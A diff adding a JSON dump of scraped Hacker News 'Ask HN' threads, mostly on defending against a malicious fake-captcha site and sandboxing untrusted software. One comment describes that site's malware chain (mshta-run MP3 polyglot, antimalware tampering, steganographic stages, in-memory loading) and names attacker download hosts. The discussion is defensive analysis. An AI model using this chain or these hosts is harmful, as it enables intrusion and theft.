+        },
+        "quoted_users": []
+      },
+      {
+        "id": "ba8a505008e059f6d4540cb16fcefb64",
+        "source_id": "49084705",
+        "content": {
+          "text": "Reporting to https://safebrowsing.google.com/safebrowsing/report_phish/ , which if their tests reproduce the problem will make most browsers unwilling to load the domain.  \nGenerally ether caused by a hacked CMS or bad advertisement. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.569407",
+        "updated_at": "2026-07-28T17:17:31.569407",
+        "author": {
+          "id": "c876d3f8481da235b559f22aba13d1f0",
+          "source_id": "ABoltzmannMush",
+          "username": "ABoltzmannMush",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "dc4b400490d24aaef9ac8d7ef0073ffa",
+        "source_id": "49085011",
+        "content": {
+          "text": "VT says no bueno: https://www.virustotal.com/gui/url/4812564b97c63e1607e9182d0... reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.570731",
+        "updated_at": "2026-07-28T17:17:31.570731",
+        "author": {
+          "id": "78fa8c12c2509a82c705b439420e676e",
+          "source_id": "goodmythical",
+          "username": "goodmythical",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "c2b5a70ae4c39df3eaee4b61b082ebdb",
+        "source_id": "49084971",
+        "content": {
+          "text": "fine-work-team.com has been reported as suspicious. Cloudflare is blocking it now. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.572076",
+        "updated_at": "2026-07-28T17:17:31.572076",
+        "author": {
+          "id": "8b6334d20b622b71f09bece157e1ddff",
+          "source_id": "joombaga",
+          "username": "joombaga",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "aec1ae2009050aaac2d99aed72821250",
+        "source_id": "49085850",
+        "content": {
+          "text": "Heh, the URL OP gave returns an MP3 file (starts with hex FF FB), at the end it mentions \"LAME3.100\" and about half a kilobyte of U's. It plays in a media player too. But I guess if it was loaded via mshta it will respond with a different payload. Now watch the people with \"overabundance of caution\" tell me what I did was stupid... reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.573479",
+        "updated_at": "2026-07-28T17:17:31.573479",
+        "author": {
+          "id": "e9ad14904ab2c395019d64499fbe361f",
+          "source_id": "netsharc",
+          "username": "netsharc",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "c54a982393042f112d57d68ca8814920",
+        "source_id": "49086800",
+        "content": {
+          "text": "> But I guess if it was loaded via mshta it will respond with a different payload. No, the MP3 file is the payload, mshta ignores the binary noise and executes the HTML in it. The HTML is in the middle of the file (search for \"DOCTYPE\") and it contains an obfuscated VBScript. Skipping many steps in the whole chain (registering a scheduled task to be executed 1 second later, disabling TLS certificate verification, corrupting the antimalware scan, deobfuscation/decryption, evasion delays, in-memory PE loading, etc.), it as a whole, roughly speaking: - downloads second stage payload from gpurq.gravityzone.army/{id} - downloads an image from i.ibb.co/Q7yqNJpr/init-block.jpg (public image hosting) with a steganographically hidden third stage payload - decrypts and loads a native PE32, heavily obfuscated and without imports reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.574964",
+        "updated_at": "2026-07-28T17:17:31.574964",
+        "author": {
+          "id": "60725ebee273d01a9f77b33b16f24915",
+          "source_id": "cybersec47",
+          "username": "cybersec47",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "feaecf54b714fc2fbdf50558054213c8",
+        "source_id": "49085252",
+        "content": {
+          "text": "> Has this happened to you before ? Almost, recently. I bought a new Mac, needed something reliable to carry around. I never had a Mac or anything from Apple before, so I wasn't familiar with how exactly does it work. I knew homebrew existed, I understood it's similar to Linux/Windows in that not all applications are in the store, but wasn't familiar at all with how those are commonly installed. Here's what I did: 1. Open Safari, the only browser there was. 2. Typed \"claude mac download\" in the search bar (needed Cowork). 3. Clicked the first link. 4. Copied the command it told me to, instructing me to run it in terminal. Only now I realize that there's something fishy about the command; it had base64 payload in it. Didn't run it and took closer look on the page - it was a Claude share (which I quickly scrolled over). I can admit mistakes, but Google, Apple and Anthropic deserve some blame here, too. - Google: pushed malware link up top, didn't (distinctly, at least) mark it as a paid result and I'd swear it didn't show me the URL (which I usually always check before clicking, but maybe I just missed it as the search results are rendered differently from Kagi's) - Safari: hides path by default, so all you see is \"claude.ai\". Someone probably thought this looked nice, I think it's just borderline idiotic. - Anthropic: hosts what's essentially a user-content on their main domain. Also recently saw a few legit projects using base64 in their install one-liners. Please, stop it. > How do you protect yourself ? Installed not Safari and made Google not my default search engine, as I always do. That way I at least always know where I am. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.576555",
+        "updated_at": "2026-07-28T17:17:31.576555",
+        "author": {
+          "id": "dc73e8a5fa6c53b683e3a18227e6d38d",
+          "source_id": "confusedbucket",
+          "username": "confusedbucket",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "cb9bfee31f12f344b2bb2b79b49db358",
+        "source_id": "49085053",
+        "content": {
+          "text": "> How do i protect myself from these scams / hack attempts in the future Endless vigilance. Scammers are always working on new tricks. You were rightly suspicious and not fooled by this one. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.578013",
+        "updated_at": "2026-07-28T17:17:31.578013",
+        "author": {
+          "id": "09e4935f62f4a4b1c17fb25be787e5cf",
+          "source_id": "SoftTalker",
+          "username": "SoftTalker",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "931f35c45ac550ff8faeb2d986778986",
+        "source_id": "49086294",
+        "content": {
+          "text": "> How do you protect yourself ? As a \"end-user\" one of the most effective way is to either disable js, which isn't the most practical thing for most of us. You can also use ublock-origin, it doesn't only block ads! \nYou can also throw a lying-DNS in the chain, either by using something like Quad9 or a local resolver with appropriate blocklists (think of unbound or for a more user-friendly solution piehole) Also an anti-virus can help detect the usual stealer that will be dropped by these FakeCaptcha/ClickFix attack, but they are also easily bypassed, that's why you need multiple layers of protection : each of them can and will fail reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.579547",
+        "updated_at": "2026-07-28T17:17:31.579547",
+        "author": {
+          "id": "b97095255ed00ed851d88fda86b054a1",
+          "source_id": "nargek",
+          "username": "nargek",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "2fbe0dd0e87f7428e6da242de24b4d42",
+        "source_id": "49084661",
+        "content": {
+          "text": "> showed showed reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.581072",
+        "updated_at": "2026-07-28T17:17:31.581072",
+        "author": {
+          "id": "52bbc2942614673d6ea01435868b3ae5",
+          "source_id": "baggachipz",
+          "username": "baggachipz",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "e0e478956faea708adc256cb97b8aa84",
+        "source_id": "49086011",
+        "content": {
+          "text": "I have seen it before in infected WordPress instances related to recent remote RCE. Probably one victim more. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.582628",
+        "updated_at": "2026-07-28T17:17:31.582628",
+        "author": {
+          "id": "198cba5be4d37f730dd96d86abb96724",
+          "source_id": "nicce",
+          "username": "nicce",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "9b15c782fec02a5264011a4b603b7252",
+        "source_id": "49084785",
+        "content": {
+          "text": "pinged one of the authors on bsky, let's see reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.584235",
+        "updated_at": "2026-07-28T17:17:31.584235",
+        "author": {
+          "id": "f767074d7cedeee20f58b21ecbced89e",
+          "source_id": "bschne",
+          "username": "bschne",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "5bbb4c8c2f91bcfe2f5e25c03d5b7f36",
+        "source_id": "49084750",
+        "content": {
+          "text": "It’s a typical technique, report it to safe browsing, upload it to VirusTotal, that should be tit flagged quickly reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:31.585828",
+        "updated_at": "2026-07-28T17:17:31.585828",
+        "author": {
+          "id": "2fd348a46d747a94655edeaf453234d4",
+          "source_id": "sharedptr",
+          "username": "sharedptr",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      }
+    ],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:31.587108",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "76b7b42ba2124e69e9d99ebe3092d75f",
+      "source_id": "49081599",
+      "title": "Ask HN: Thoughts on AMD Ryzen AI MAX+ 395 for Local AI?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.579775",
+      "updated_at": "2026-07-28T17:17:16.579775",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "bd6db7cbd980adc9d9b10a40a47c1f1d",
+        "source_id": "mempirate",
+        "username": "mempirate",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 2,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49081599",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:33.981617",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "d2e7331b6dab4a61ad12032171aff060",
+      "source_id": "49081491",
+      "title": "Ask HN: Is there legal risk in AI memory?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.580319",
+      "updated_at": "2026-07-28T17:17:16.580319",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "7216f0df72439bae90838c660858a0a9",
+        "source_id": "sarjann",
+        "username": "sarjann",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 2,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49081491",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:38.251337",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "9606cf05be3b095d9e533a6fcf626009",
+      "source_id": "49080672",
+      "title": "Ask HN: What do you use local models for?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.580957",
+      "updated_at": "2026-07-28T17:17:16.580957",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "7ce77f2f5fa32b8e8fdd454513488b08",
+        "source_id": "tjomk",
+        "username": "tjomk",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 3,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49080672",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:42.221230",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "0c93ae2ddc44b235448b76d9c6f9fcd5",
+      "source_id": "49075417",
+      "title": "Ask HN: How to deal with security implications of running/installing projects?",
+      "content": {
+        "text": "<div class=\"toptext\" style=\"margin-top:4px\">There are so many neat projects coming out on HN/Github, etc. But, it's so easy to inject back doors and malware into software projects now a days. I'm wondering how people deal with the secrutiy of this. Even if you install them under docker, if it's run by root it seems like there are ways they can get root access on the box.<p>I see so many neat projects here I'd like to try out but I'm worried that I may install some malware or backdoored software on here. There are a few AI harnesses, terminals, etc. that keep coming up that look neat... but at the very least they'd be able to get your Claude credentials, if not worse.<p>I'm just wondering with so much stuff coming out, most of it AI coded.<p>Just wondering how people deal with it? What's the best sandbox way of testing it if that's the solution?</p></p></p></div>",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.581481",
+      "updated_at": "2026-07-28T17:17:16.581481",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "492c52d64614eda7b248900d3f71c004",
+        "source_id": "johng",
+        "username": "johng",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 12,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49075417",
+      "section": "Ask HN"
+    },
+    "replies": [
+      {
+        "id": "56e6c4da3e7195cbcb423ea09b13107f",
+        "source_id": "49077114",
+        "content": {
+          "text": "A simple qemu virtual machine is nice and quick to spin up. I mainly work inside an openbsd or linux virtual machine. I use a different vm for each project and I have a \"sandbox\" vm I use to run random things I download/test. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.453284",
+        "updated_at": "2026-07-28T17:17:44.453284",
+        "author": {
+          "id": "c51d378a3ae07c8b33594157050138ba",
+          "source_id": "bitbasher",
+          "username": "bitbasher",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "5656c7349de14d0804819dee1348d550",
+        "source_id": "49076724",
+        "content": {
+          "text": "https://dl.acm.org/doi/10.1145/358198.358210 reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.453774",
+        "updated_at": "2026-07-28T17:17:44.453774",
+        "author": {
+          "id": "630853b6b882c0e4d995bf58cad643bc",
+          "source_id": "gabrielsroka",
+          "username": "gabrielsroka",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "fa3e3824ed7f679340745d62458d7045",
+        "source_id": "49076092",
+        "content": {
+          "text": "Have you tried VirtualBox? That’s my go-to for running un-trusted code. Start with a clean VM/fresh install, and don’t put any secrets in it. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.454256",
+        "updated_at": "2026-07-28T17:17:44.454256",
+        "author": {
+          "id": "266fcd42a1002b29dc89fed2d3a931ca",
+          "source_id": "ebcode",
+          "username": "ebcode",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "3f3c2d7d7637bb5475d52dbd303a5171",
+        "source_id": "49076459",
+        "content": {
+          "text": "I think that might be the only way. That or maybe even this? https://github.com/89luca89/distrobox reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.454751",
+        "updated_at": "2026-07-28T17:17:44.454751",
+        "author": {
+          "id": "492c52d64614eda7b248900d3f71c004",
+          "source_id": "johng",
+          "username": "johng",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "a08f7e82094eea8b69a1c2ac4de92cc9",
+        "source_id": "49077091",
+        "content": {
+          "text": "I assume that if it's not air-gapped, it's compromised. I keep important stuff offline. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.455271",
+        "updated_at": "2026-07-28T17:17:44.455271",
+        "author": {
+          "id": "635a56dfcbd915aac77a0968ca9ab16e",
+          "source_id": "afpx",
+          "username": "afpx",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "943d6b54755bff369ef30f7b236c5e58",
+        "source_id": "49075638",
+        "content": {
+          "text": "Have you considered Qubes OS, https://qubes-os.org ? It is more secure than Xen, which it relies on, https://www.qubes-os.org/security/xsa/#statistics . reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.455899",
+        "updated_at": "2026-07-28T17:17:44.455899",
+        "author": {
+          "id": "60a2f4eb97a0453ecf3773aefcb38d5c",
+          "source_id": "fsflover",
+          "username": "fsflover",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "d21155c6b47f1a7e8e3e85f08242a158",
+        "source_id": "49075931",
+        "content": {
+          "text": "I've always been interested in Qubes OS but it definitely seems like a very high pain point. I can see installing these things on VM's and then maybe trying to inspect traffic outbound to see if there is something untoward, but even that can be hidden pretty well. Hell, I've installed some older \"known good\" packages and some of them have so many dependencies that are pulled in automatically, the app itself could be good but one of the obscure dependencies that it requires could be hacked and now you are still running hacked software. It just seems really scary to install nearly anything now. AI can inject an obfuscated backdoor in seemingly good software, and it can spread at a speed that humans couldn't have back in the day. I'm just hesitant with new software now and it's kind of sad. So much stuff I want to test but I'm afraid to test it. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.456478",
+        "updated_at": "2026-07-28T17:17:44.456478",
+        "author": {
+          "id": "492c52d64614eda7b248900d3f71c004",
+          "source_id": "johng",
+          "username": "johng",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "ce68bb77981f60e2c96b2aa83df08844",
+        "source_id": "49077985",
+        "content": {
+          "text": "Give Qubes OS a shot. It's significantly less challenging to run than it used to be, and a (small, I admit) number of us daily drive it. Hardware support these days, while far from perfect, is much better. It's not the daunting slog to get it going that it used to be. Provided you aren't looking to run accelerated graphics or care about integrated Bluetooth, you should be fine. I'd recommend any Intel laptop (and some AMDs) with built-in Ethernet, just in case it doesn't like the Wi-Fi card. Install with kernel-latest (it's a simple option when you boot into the installer ISO), and try it out. Grab a T480/T480s if you have one handy, and you may be surprised. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.457077",
+        "updated_at": "2026-07-28T17:17:44.457077",
+        "author": {
+          "id": "ea6821502e1f2ea1ca3f2df4e6dcd397",
+          "source_id": "handedness",
+          "username": "handedness",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "2f92050418ee77ffe598e21ec6350d1f",
+        "source_id": "49078884",
+        "content": {
+          "text": "I have a bunch of desktops and mini desktops I have laying around I can try it on. I'm assuming it works on most Linux hardware, except maybe the wifi? For example I have a few Beelink GK Minis and Geekom computers. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.457697",
+        "updated_at": "2026-07-28T17:17:44.457697",
+        "author": {
+          "id": "492c52d64614eda7b248900d3f71c004",
+          "source_id": "johng",
+          "username": "johng",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "75defc3baa5edb15c37535675fe547e9",
+        "source_id": "49079365",
+        "content": {
+          "text": "Generally speaking, if your Wi-Fi works on Debian and/or Fedora, it should work on Qubes OS. There are exceptions to that, of course. On a desktop PC you'll have to make some tradeoffs versus most laptops, namely integrating sys-net and sys-usb, but the installer will handle that for you. You'll want to auto-accept your keyboard and mouse, and try not to shut down sys-net. But you'll learn. Since your concern is isolating software you're running, and not necessarily isolating untrusted USB devices, that's not a big loss. Give it a shot on a few machines and report back. Even better, try it and submit HCL reports to inform others: https://www.qubes-os.org/hcl/ Intel is generally easier than AMD, but I've run it on pretty modern AMD mobile chipsets with a lot of success. Again, kernel-latest is your friend, and look online to see if anyone recommends any particular kernel flags. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:44.458418",
+        "updated_at": "2026-07-28T17:17:44.458418",
+        "author": {
+          "id": "ea6821502e1f2ea1ca3f2df4e6dcd397",
+          "source_id": "handedness",
+          "username": "handedness",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      }
+    ],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:44.458748",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "18610db1a2e26a54351d5f3e2e371dfb",
+      "source_id": "49067602",
+      "title": "Ask HN: Why is every company encorporating AI everywhere?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.582114",
+      "updated_at": "2026-07-28T17:17:16.582114",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "59a377cf301a57ad403f4ca462fd49f6",
+        "source_id": "vanessa1211",
+        "username": "vanessa1211",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 24,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49067602",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:48.394732",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "69839aac49a9d354ad88e4749fc274be",
+      "source_id": "49078588",
+      "title": "Ask HN: What apps are you building?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.582766",
+      "updated_at": "2026-07-28T17:17:16.582766",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "0592df25437418ffdf9702278350e84b",
+        "source_id": "totaldude87",
+        "username": "totaldude87",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 13,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49078588",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:52.482392",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "864a3043c2d23ba1f68105e0fe2c811b",
+      "source_id": "49057972",
+      "title": "Ask HN: What are the most promising RL fields for a new master student?",
+      "content": {
+        "text": "<div class=\"toptext\" style=\"margin-top:4px\">i am an incoming msc student thinking about a research direction in reinforcement learning. which rl subfields do you think have the most potential right now? i am particularly interested in emboddied ai and bcis.</div>",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.583299",
+      "updated_at": "2026-07-28T17:17:16.583299",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "b06c582b5e0ea48584061da22f769cba",
+        "source_id": "zecice",
+        "username": "zecice",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 34,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49057972",
+      "section": "Ask HN"
+    },
+    "replies": [
+      {
+        "id": "e9657f15123fc0b5370aef61f2df2e93",
+        "source_id": "49058520",
+        "content": {
+          "text": "General advice from a CV PhD dropout: Lean onto the interests of assistant professors at your school instead of trying to find promising RL subtopics. This way you can get time with someone who’s deep in the field and can be a guiding light for your projects. If you’re really into embodied AI, you can add that to an existing project but doing it by yourself can be extremely tough especially if your topic requires a lot of compute and your last name is not Rockefeller. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.329300",
+        "updated_at": "2026-07-28T17:17:54.329300",
+        "author": {
+          "id": "a46f5c74814b047d5a740242fd2463c8",
+          "source_id": "gessha",
+          "username": "gessha",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "ec5aad6250995d6ee24c71a1880efd27",
+        "source_id": "49058868",
+        "content": {
+          "text": "Concur! (CS PhD) And in general, depending on \"funding\", simply tapping latent ideas from profs will be an instant win-win. They've wanted to try it, and you've wanted to do work in the field. Approach it that way, as a meaningful collaboration for both of you - and if you have more than one option, then bias towards personality match and \"fun\" factor. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.329787",
+        "updated_at": "2026-07-28T17:17:54.329787",
+        "author": {
+          "id": "6986f400613cac008fa065d32dee109f",
+          "source_id": "jvanderbot",
+          "username": "jvanderbot",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "12e1a7a6012e639696d4b59036735c96",
+        "source_id": "49058738",
+        "content": {
+          "text": "It is especially important to work with early-stage researchers, as they are more eager to publish and obtain career stability than full professors. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.330263",
+        "updated_at": "2026-07-28T17:17:54.330263",
+        "author": {
+          "id": "8084b5d1ae53c6c6bc8d3a688a3d3b5b",
+          "source_id": "Tryk",
+          "username": "Tryk",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "26df251066ced8f3fc42aa59375e7df2",
+        "source_id": "49060103",
+        "content": {
+          "text": "thanks! i found this approach helpful in my undergrad studies as well reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.330755",
+        "updated_at": "2026-07-28T17:17:54.330755",
+        "author": {
